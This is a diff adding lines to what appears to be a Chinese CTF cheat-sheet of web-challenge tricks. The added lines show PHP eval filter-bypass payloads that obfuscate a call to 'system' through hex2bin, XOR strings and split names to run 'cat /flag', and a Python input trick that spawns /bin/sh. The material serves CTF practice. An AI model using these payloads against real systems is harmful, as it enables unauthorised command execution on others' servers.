@@ -78,6 +78,9 @@ md4与自己相等0e251288019
 python复读输出自己：exec(s:='print("exec(s:=%r)"%s)')、s='s=%r;print(s%%s)';print(s%s)，如果需要逆序啥的替换s里面的即可
 大写或小写变为指定字符绕过可参考【大小写转换绕过.htm】
 购买入卖出之类的题注意是否存在四舍五入导致收入增加
+eval可以利用括号绕过：(s.y.s.t.e.m)('cat /flag');、hex2bin('73797374656d')('cat /flag');、('0000000'^'CICDU]')('cat /flag');
+eval没思路先看下phpinfo();有没有过滤disable_functions
+python的input可以用__import__('os').system('/bin/sh')执行任意命令
 Perl（.pl）站文件上传任意命令执行：
 内容添加：
 -----------------------------312623419042421556082293855654
